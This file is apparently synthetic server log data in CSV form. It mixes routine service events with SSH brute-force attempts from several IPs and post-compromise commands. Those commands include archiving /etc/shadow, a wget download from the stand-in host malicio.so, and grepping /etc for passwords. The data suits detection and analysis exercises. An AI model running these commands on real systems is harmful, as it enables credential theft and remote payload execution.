timestamp,host,service,pid,message
Mar 25 12:31:08,db-server-02,sshd,6117,Failed password for oracle from 51.15.20.30 port 35085
Mar 25 12:31:15,db-server-02,sshd,6122,Failed password for user123 from 51.15.20.30 port 52025
Mar 25 12:31:27,db-server-02,sshd,6128,Failed password for admin from 51.15.20.30 port 30851
Mar 25 12:46:36,ip-10-50-30-100,sshd,7372,Accepted publickey for admin from 10.0.0.50
Mar 25 12:47:22,server-prod-01,sshd,4117,Accepted publickey for admin from 85.245.107.41
Mar 25 13:09:33,ip-10-50-30-100,proftpd,9082,"Connection from 85.245.107.41, user ftp_user, command LIST"
Mar 25 13:12:38,ip-10-77-20-248,service,3208,Started mysql service
Mar 25 13:28:16,ip-10-50-30-100,sshd,8261,Failed password for developer from 10.0.0.50 port 58451
Mar 25 14:38:29,ip-10-77-20-248,systemd,2976,Started Daily backup
Mar 25 14:47:07,ip-10-77-20-248,systemd,2262,Started System maintenance
Mar 25 14:47:47,ip-10-50-30-100,service,1975,Started nginx service
Mar 25 14:55:33,db-server-02,sshd,5068,Invalid user test from 194.87.139.38
Mar 25 14:55:34,db-server-02,sshd,5084,Failed password for guest from 194.87.139.38 port 53412
Mar 25 14:55:44,db-server-02,sshd,5067,Invalid user test from 194.87.139.38
Mar 25 14:55:44,db-server-02,sshd,5069,Invalid user test from 194.87.139.38
Mar 25 14:56:37,db-server-02,sshd,5094,Failed password for oracle from 194.87.139.38 port 45429
Mar 25 14:56:41,db-server-02,sshd,5086,Failed password for test from 194.87.139.38 port 56483
Mar 25 14:56:56,db-server-02,sshd,5091,Failed password for oracle from 194.87.139.38 port 40185
Mar 25 14:57:20,db-server-02,sshd,5087,Failed password for admin from 194.87.139.38 port 44673
Mar 25 14:57:20,db-server-02,sshd,5073,Failed password for test from 194.87.139.38 port 55972
Mar 25 14:57:32,db-server-02,sshd,5077,Failed password for oracle from 194.87.139.38 port 30101
Mar 25 14:57:37,db-server-02,sshd,5076,Failed password for guest from 194.87.139.38 port 30992
Mar 25 14:57:40,db-server-02,sshd,5089,Failed password for admin from 194.87.139.38 port 37212
Mar 25 14:57:45,db-server-02,sshd,5070,Failed password for admin from 194.87.139.38 port 43979
Mar 25 14:58:13,db-server-02,sshd,5083,Failed password for guest from 194.87.139.38 port 59896
Mar 25 14:58:26,db-server-02,sshd,5080,Failed password for oracle from 194.87.139.38 port 59938
Mar 25 14:58:40,db-server-02,sshd,5082,Failed password for root from 194.87.139.38 port 37392
Mar 25 14:58:47,db-server-02,sshd,5078,Failed password for test from 194.87.139.38 port 56699
Mar 25 14:58:58,db-server-02,sshd,5092,Failed password for user123 from 194.87.139.38 port 58435
Mar 25 14:59:34,db-server-02,sshd,5088,Failed password for guest from 194.87.139.38 port 37969
Mar 25 14:59:45,db-server-02,sshd,5081,Failed password for root from 194.87.139.38 port 40837
Mar 25 14:59:59,db-server-02,sshd,5075,Failed password for admin from 194.87.139.38 port 39192
Mar 25 15:00:01,db-server-02,sshd,5090,Failed password for root from 194.87.139.38 port 33087
Mar 25 15:00:10,db-server-02,sshd,5085,Failed password for admin from 194.87.139.38 port 55043
Mar 25 15:00:18,db-server-02,sshd,5072,Failed password for admin from 194.87.139.38 port 54881
Mar 25 15:00:20,db-server-02,sshd,5093,Failed password for root from 194.87.139.38 port 57844
Mar 25 15:00:21,db-server-02,sshd,5071,Failed password for guest from 194.87.139.38 port 46919
Mar 25 15:00:21,db-server-02,sshd,5074,Failed password for oracle from 194.87.139.38 port 59286
Mar 25 15:00:31,db-server-02,sshd,5079,Failed password for user123 from 194.87.139.38 port 54351
Mar 25 15:08:33,ip-10-50-30-100,sudo,3495,deploy : TTY=pts/2 ; COMMAND=systemctl restart nginx
Mar 25 15:10:03,ip-10-50-30-100,systemd,5307,Started System maintenance
Mar 25 15:12:26,ip-10-77-20-248,sudo,8551,backup : TTY=pts/1 ; COMMAND=cd /var/www
Mar 25 15:24:38,db-server-02,vsftpd,7659,Anonymous login attempted from 61.177.172.1
Mar 25 15:24:42,db-server-02,proftpd,5329,Anonymous user from 61.177.172.1 executed: LIST
Mar 25 15:53:11,ip-10-50-30-100,systemd,1858,Started Daily backup
Mar 25 15:55:21,db-server-02,service,6055,Started redis service
Mar 25 15:59:20,ip-10-77-20-248,sshd,1066,Accepted publickey for admin from 172.16.0.25
Mar 25 16:16:59,ip-10-50-30-100,service,8282,Started mysql service
Mar 25 16:24:06,server-prod-01,sudo,9383,ci-cd : TTY=pts/0 ; COMMAND=systemctl restart nginx
Mar 25 16:26:46,ip-10-50-30-100,systemd,3647,Started Log rotation
Mar 25 16:34:04,ip-10-77-20-248,service,8616,Started cron service
Mar 25 16:38:01,server-prod-01,sudo,4382,ci-cd : TTY=pts/0 ; COMMAND=systemctl restart nginx
Mar 25 16:38:26,server-prod-01,service,1154,Started docker service
Mar 25 16:47:40,ip-10-77-20-248,cron,1751,Started Daily backup
Mar 25 16:49:37,db-server-02,service,1891,Started mysql service
Mar 25 17:13:10,ip-10-77-20-248,cron,3994,Started Log rotation
Mar 25 17:33:19,ip-10-77-20-248,cron,6656,Started System maintenance
Mar 25 17:43:25,db-server-02,sshd,2154,Accepted publickey for ubuntu from 10.0.0.50
Mar 25 17:47:45,ip-10-77-20-248,systemd,3639,Started Daily backup
Mar 25 17:55:58,db-server-02,systemd,6382,Started Daily backup
Mar 25 18:11:37,server-prod-01,sudo,2595,ubuntu : TTY=pts/0 ; COMMAND=cat /var/log/syslog
Mar 25 18:22:51,db-server-02,sshd,6547,Accepted publickey for backup from 85.245.107.41
Mar 25 18:23:03,ip-10-50-30-100,sshd,4611,Accepted publickey for ci-cd from 10.0.0.50
Mar 25 18:45:36,db-server-02,sshd,4901,Accepted publickey for backup from 85.245.107.41
Mar 25 19:11:12,db-server-02,sshd,6607,Invalid user guest from 62.210.83.178
Mar 25 19:11:13,db-server-02,sshd,6609,Invalid user test from 62.210.83.178
Mar 25 19:11:14,db-server-02,sshd,6606,Invalid user guest from 62.210.83.178
Mar 25 19:11:14,db-server-02,sshd,6618,Failed password for admin from 62.210.83.178 port 32251
Mar 25 19:11:15,ip-10-50-30-100,cron,4176,Started Log rotation
Mar 25 19:11:20,db-server-02,sshd,6608,Invalid user test from 62.210.83.178
Mar 25 19:11:25,db-server-02,sshd,6623,Failed password for oracle from 62.210.83.178 port 31818
Mar 25 19:11:32,db-server-02,sshd,6626,Failed password for test from 62.210.83.178 port 51639
Mar 25 19:11:44,db-server-02,sshd,6616,Failed password for test from 62.210.83.178 port 58388
Mar 25 19:12:09,server-prod-01,cron,1764,Started Daily backup
Mar 25 19:12:33,db-server-02,sshd,6614,Failed password for guest from 62.210.83.178 port 36271
Mar 25 19:13:51,db-server-02,sshd,6613,Failed password for guest from 62.210.83.178 port 49250
Mar 25 19:14:05,db-server-02,sshd,6611,Failed password for test from 62.210.83.178 port 59162
Mar 25 19:14:20,db-server-02,sshd,6619,Failed password for user123 from 62.210.83.178 port 37246
Mar 25 19:14:20,db-server-02,sshd,6617,Failed password for root from 62.210.83.178 port 50968
Mar 25 19:14:21,db-server-02,sshd,6612,Failed password for oracle from 62.210.83.178 port 40495
Mar 25 19:14:31,db-server-02,sshd,6622,Failed password for guest from 62.210.83.178 port 59548
Mar 25 19:14:31,db-server-02,sshd,6625,Failed password for oracle from 62.210.83.178 port 57498
Mar 25 19:14:41,db-server-02,sshd,6620,Failed password for admin from 62.210.83.178 port 31857
Mar 25 19:14:45,db-server-02,sshd,6624,Failed password for guest from 62.210.83.178 port 47074
Mar 25 19:14:55,db-server-02,sshd,6615,Failed password for test from 62.210.83.178 port 53760
Mar 25 19:15:53,db-server-02,sshd,6610,Failed password for test from 62.210.83.178 port 56813
Mar 25 19:15:53,db-server-02,sshd,6627,Failed password for user123 from 62.210.83.178 port 37283
Mar 25 19:16:06,db-server-02,sshd,6621,Failed password for oracle from 62.210.83.178 port 49142
Mar 25 19:16:46,ip-10-77-20-248,service,3800,Started docker service
Mar 25 19:30:01,ip-10-77-20-248,sshd,6495,Accepted publickey for ci-cd from 85.245.107.41
Mar 25 19:31:20,ip-10-77-20-248,cron,5564,Started Daily backup
Mar 25 19:40:30,db-server-02,systemd,6040,Started Daily backup
Mar 25 19:40:46,server-prod-01,cron,9884,Started Daily backup
Mar 25 19:42:37,db-server-02,sshd,7772,Invalid user guest from 62.210.83.178
Mar 25 19:42:38,db-server-02,sshd,7776,Failed password for root from 62.210.83.178 port 45471
Mar 25 19:42:38,db-server-02,sshd,7770,Invalid user guest from 62.210.83.178
Mar 25 19:42:40,db-server-02,sshd,7773,Invalid user admin from 62.210.83.178
Mar 25 19:42:42,db-server-02,sshd,7771,Invalid user test from 62.210.83.178
Mar 25 19:42:57,db-server-02,sshd,7791,Failed password for guest from 62.210.83.178 port 50089
Mar 25 19:43:21,db-server-02,sshd,7778,Failed password for oracle from 62.210.83.178 port 35626
Mar 25 19:43:39,db-server-02,sshd,7777,Failed password for root from 62.210.83.178 port 31752
Mar 25 19:44:03,db-server-02,sshd,7784,Failed password for root from 62.210.83.178 port 50438
Mar 25 19:44:46,db-server-02,sshd,7783,Failed password for user123 from 62.210.83.178 port 48304
Mar 25 19:45:22,db-server-02,sshd,7787,Failed password for user123 from 62.210.83.178 port 47300
Mar 25 19:45:25,db-server-02,sshd,7789,Failed password for admin from 62.210.83.178 port 41038
Mar 25 19:45:58,db-server-02,sshd,7782,Failed password for test from 62.210.83.178 port 41634
Mar 25 19:45:59,db-server-02,sshd,7788,Failed password for test from 62.210.83.178 port 39467
Mar 25 19:46:00,db-server-02,sshd,7785,Failed password for root from 62.210.83.178 port 46723
Mar 25 19:46:05,db-server-02,sshd,7775,Failed password for guest from 62.210.83.178 port 44029
Mar 25 19:46:16,db-server-02,sshd,7790,Failed password for admin from 62.210.83.178 port 49360
Mar 25 19:46:17,db-server-02,sshd,7786,Failed password for user123 from 62.210.83.178 port 32924
Mar 25 19:46:40,ip-10-77-20-248,proftpd,3745,"Connection from 192.168.1.100, user ftp_user, command LIST"
Mar 25 19:46:55,db-server-02,sshd,7774,Failed password for admin from 62.210.83.178 port 53342
Mar 25 19:47:07,db-server-02,sshd,7779,Failed password for guest from 62.210.83.178 port 54187
Mar 25 19:47:27,db-server-02,sshd,7780,Failed password for oracle from 62.210.83.178 port 36245
Mar 25 19:47:27,db-server-02,sshd,7781,Failed password for admin from 62.210.83.178 port 55210
Mar 25 19:55:33,server-prod-01,sudo,7943,admin : TTY=pts/1 ; COMMAND=systemctl restart nginx
Mar 25 20:41:30,db-server-02,systemd,3868,Started Daily backup
Mar 25 20:44:28,ip-10-50-30-100,sudo,9952,backup : TTY=pts/2 ; COMMAND=cat /var/log/syslog
Mar 25 20:57:06,server-prod-01,service,4775,Started docker service
Mar 25 21:00:13,server-prod-01,sudo,9551,ubuntu : TTY=pts/1 ; COMMAND=/usr/bin/sudo -l
Mar 25 21:07:46,server-prod-01,systemd,6422,Started System maintenance
Mar 25 21:32:40,ip-10-77-20-248,sudo,6375,deploy : TTY=pts/1 ; COMMAND=ls -la
Mar 25 21:36:14,ip-10-77-20-248,sshd,9405,Accepted password for admin from 218.188.2.4
Mar 25 21:36:15,ip-10-77-20-248,sshd,9379,Invalid user test from 218.188.2.4
Mar 25 21:36:24,ip-10-77-20-248,sshd,9380,Invalid user guest from 218.188.2.4
Mar 25 21:36:26,ip-10-77-20-248,sshd,9378,Invalid user admin from 218.188.2.4
Mar 25 21:36:26,ip-10-77-20-248,sshd,9377,Invalid user guest from 218.188.2.4
Mar 25 21:36:34,ip-10-77-20-248,sshd,9403,Failed password for oracle from 218.188.2.4 port 59991
Mar 25 21:36:36,ip-10-77-20-248,sshd,9399,Failed password for admin from 218.188.2.4 port 38328
Mar 25 21:37:08,ip-10-77-20-248,sshd,9388,Failed password for user123 from 218.188.2.4 port 54818
Mar 25 21:37:11,ip-10-77-20-248,bash,7243,ps aux
Mar 25 21:37:16,ip-10-77-20-248,sudo,7921,root : TTY=pts/2 ; COMMAND=tar -czf /tmp/data.tar.gz /etc/shadow
Mar 25 21:37:27,ip-10-77-20-248,sshd,9384,Failed password for guest from 218.188.2.4 port 36505
Mar 25 21:37:35,ip-10-77-20-248,sshd,9394,Failed password for root from 218.188.2.4 port 59724
Mar 25 21:37:46,ip-10-77-20-248,sshd,9401,Failed password for guest from 218.188.2.4 port 59076
Mar 25 21:38:01,ip-10-77-20-248,sshd,9389,Failed password for oracle from 218.188.2.4 port 37813
Mar 25 21:38:23,ip-10-77-20-248,sshd,9390,Failed password for root from 218.188.2.4 port 54244
Mar 25 21:38:35,ip-10-77-20-248,sshd,9393,Failed password for root from 218.188.2.4 port 35621
Mar 25 21:38:37,ip-10-77-20-248,sshd,9387,Failed password for admin from 218.188.2.4 port 56691
Mar 25 21:39:00,ip-10-77-20-248,sshd,9402,Failed password for oracle from 218.188.2.4 port 53784
Mar 25 21:39:02,ip-10-77-20-248,sshd,9382,Failed password for guest from 218.188.2.4 port 38541
Mar 25 21:39:06,ip-10-77-20-248,sshd,9381,Failed password for guest from 218.188.2.4 port 44586
Mar 25 21:39:07,ip-10-77-20-248,sshd,9383,Failed password for admin from 218.188.2.4 port 37706
Mar 25 21:39:19,ip-10-77-20-248,sshd,9386,Failed password for root from 218.188.2.4 port 53378
Mar 25 21:39:25,ip-10-77-20-248,sshd,9396,Failed password for oracle from 218.188.2.4 port 34595
Mar 25 21:39:56,ip-10-77-20-248,sshd,9398,Failed password for oracle from 218.188.2.4 port 32246
Mar 25 21:40:04,ip-10-77-20-248,sshd,9404,Failed password for root from 218.188.2.4 port 46846
Mar 25 21:40:31,ip-10-77-20-248,sshd,9397,Failed password for oracle from 218.188.2.4 port 55183
Mar 25 21:40:39,ip-10-77-20-248,sshd,9385,Failed password for user123 from 218.188.2.4 port 57257
Mar 25 21:40:40,ip-10-77-20-248,sshd,9392,Failed password for admin from 218.188.2.4 port 56100
Mar 25 21:41:01,ip-10-77-20-248,sshd,9391,Failed password for oracle from 218.188.2.4 port 48085
Mar 25 21:41:01,ip-10-77-20-248,sshd,9400,Failed password for user123 from 218.188.2.4 port 38690
Mar 25 21:41:12,ip-10-77-20-248,sshd,9395,Failed password for admin from 218.188.2.4 port 32638
Mar 25 21:53:17,ip-10-50-30-100,service,6986,Started nginx service
Mar 25 21:55:28,ip-10-77-20-248,service,1908,Started postgres service
Mar 25 21:55:58,ip-10-50-30-100,cron,7130,Started Log rotation
Mar 25 21:58:46,ip-10-77-20-248,service,1084,Started redis service
Mar 25 22:11:33,server-prod-01,sudo,4465,ubuntu : TTY=pts/0 ; COMMAND=cat /var/log/syslog
Mar 25 22:15:42,ip-10-50-30-100,systemd,1641,Started Log rotation
Mar 25 22:21:00,ip-10-50-30-100,systemd,8811,Started Daily backup
Mar 25 22:35:25,ip-10-77-20-248,systemd,9318,Started Log rotation
Mar 25 22:36:25,ip-10-50-30-100,service,1836,Started mysql service
Mar 25 22:43:18,ip-10-77-20-248,service,3190,Started postgres service
Mar 25 22:43:18,ip-10-50-30-100,cron,8176,Started Log rotation
Mar 25 22:54:02,db-server-02,sudo,4389,backup : TTY=pts/0 ; COMMAND=git pull
Mar 25 23:16:53,db-server-02,systemd,5733,Started System maintenance
Mar 25 23:17:27,db-server-02,systemd,4772,Started System maintenance
Mar 25 23:20:20,server-prod-01,service,8775,Started cron service
Mar 25 23:24:45,db-server-02,systemd,7816,Started Log rotation
Mar 25 23:26:07,ip-10-50-30-100,cron,4574,Started Log rotation
Mar 25 23:31:10,ip-10-77-20-248,sudo,4025,ubuntu : TTY=pts/0 ; COMMAND=systemctl restart nginx
Mar 25 23:33:04,db-server-02,sudo,9818,ci-cd : TTY=pts/0 ; COMMAND=/usr/bin/sudo -l
Mar 25 23:33:08,db-server-02,sudo,5322,ci-cd : TTY=pts/0 ; COMMAND=wget http://malicio.so/script.sh -O /tmp/script
Mar 25 23:33:49,db-server-02,bash,6080,grep -r 'password' /etc/
Mar 25 23:45:52,server-prod-01,systemd,3898,Started Daily backup
Mar 25 23:50:11,server-prod-01,vsftpd,5543,"Connection from 10.0.0.50, user ftp_user, command RETR file.txt"
Mar 25 23:56:56,db-server-02,systemd,6454,Started Log rotation
Mar 26 00:20:17,ip-10-50-30-100,sshd,8004,Accepted publickey for ci-cd from 192.168.1.100
Mar 26 00:33:52,ip-10-50-30-100,systemd,6730,Started Daily backup
Mar 26 00:37:03,ip-10-50-30-100,cron,4205,Started Log rotation
Mar 26 00:38:23,server-prod-01,sudo,6688,ubuntu : TTY=pts/0 ; COMMAND=apt update
Mar 26 00:39:13,ip-10-77-20-248,cron,5248,Started Daily backup
Mar 26 00:46:59,ip-10-50-30-100,cron,3349,Started Daily backup
Mar 26 00:47:36,db-server-02,sudo,9127,admin : TTY=pts/0 ; COMMAND=/usr/bin/sudo -l
Mar 26 00:47:49,db-server-02,bash,6967,grep -r 'password' /etc/
Mar 26 00:48:40,db-server-02,sudo,6589,admin : TTY=pts/0 ; COMMAND=wget http://malicio.so/script.sh -O /tmp/script
Mar 26 01:02:48,server-prod-01,cron,9923,Started System maintenance
Mar 26 01:12:37,db-server-02,service,3710,Started cron service
Mar 26 01:26:47,db-server-02,cron,8859,Started Daily backup
Mar 26 01:35:37,ip-10-50-30-100,systemd,2877,Started Log rotation
Mar 26 01:44:50,ip-10-77-20-248,sudo,2880,ubuntu : TTY=pts/1 ; COMMAND=cat /var/log/syslog
Mar 26 01:49:11,ip-10-50-30-100,sshd,5920,Invalid user admin from 61.177.172.1
Mar 26 01:49:12,ip-10-50-30-100,sshd,5919,Invalid user admin from 61.177.172.1
Mar 26 01:49:14,ip-10-50-30-100,sshd,5916,Invalid user test from 61.177.172.1
Mar 26 01:49:15,ip-10-50-30-100,sshd,5933,Failed password for user123 from 61.177.172.1 port 53981
Mar 26 01:49:16,ip-10-50-30-100,sshd,5917,Invalid user test from 61.177.172.1
Mar 26 01:49:18,ip-10-50-30-100,sshd,5918,Invalid user test from 61.177.172.1
Mar 26 01:49:21,ip-10-50-30-100,sshd,5923,Failed password for guest from 61.177.172.1 port 37235
Mar 26 01:49:50,ip-10-50-30-100,sshd,5928,Failed password for guest from 61.177.172.1 port 35521
Mar 26 01:50:13,ip-10-50-30-100,sshd,5922,Failed password for admin from 61.177.172.1 port 56613
Mar 26 01:50:24,ip-10-50-30-100,sshd,5924,Failed password for user123 from 61.177.172.1 port 32908
Mar 26 01:50:29,ip-10-50-30-100,sshd,5930,Failed password for guest from 61.177.172.1 port 33651
Mar 26 01:50:39,ip-10-50-30-100,sshd,5927,Failed password for test from 61.177.172.1 port 39957
Mar 26 01:51:16,ip-10-50-30-100,sshd,5937,Failed password for root from 61.177.172.1 port 40140
Mar 26 01:51:17,ip-10-50-30-100,sshd,5931,Failed password for root from 61.177.172.1 port 45264
Mar 26 01:51:48,ip-10-50-30-100,sshd,5921,Failed password for test from 61.177.172.1 port 45816
Mar 26 01:51:54,ip-10-50-30-100,sshd,5926,Failed password for admin from 61.177.172.1 port 33644
Mar 26 01:52:24,ip-10-50-30-100,sshd,5936,Failed password for test from 61.177.172.1 port 51549
Mar 26 01:52:31,ip-10-50-30-100,sshd,5934,Failed password for test from 61.177.172.1 port 32150
Mar 26 01:52:31,ip-10-50-30-100,cron,8998,Started System maintenance
Mar 26 01:52:39,ip-10-50-30-100,sshd,5929,Failed password for admin from 61.177.172.1 port 36762
Mar 26 01:53:04,ip-10-50-30-100,sshd,5932,Failed password for user123 from 61.177.172.1 port 30698
Mar 26 01:53:08,ip-10-50-30-100,sshd,5925,Failed password for root from 61.177.172.1 port 55114
Mar 26 01:53:27,ip-10-50-30-100,sshd,5935,Failed password for admin from 61.177.172.1 port 30939
Mar 26 01:53:55,ip-10-50-30-100,sshd,5938,Failed password for test from 61.177.172.1 port 57667
Mar 26 01:58:45,ip-10-50-30-100,systemd,2957,Started Daily backup
Mar 26 02:07:31,db-server-02,service,1371,Started postgres service
Mar 26 02:23:11,ip-10-50-30-100,cron,6820,Started Log rotation
Mar 26 02:30:14,db-server-02,sshd,2044,Failed password for ci-cd from 10.0.0.50 port 37590
Mar 26 02:37:07,ip-10-77-20-248,sshd,8102,Accepted publickey for ubuntu from 85.245.107.41
Mar 26 02:44:58,ip-10-77-20-248,systemd,7348,Started System maintenance
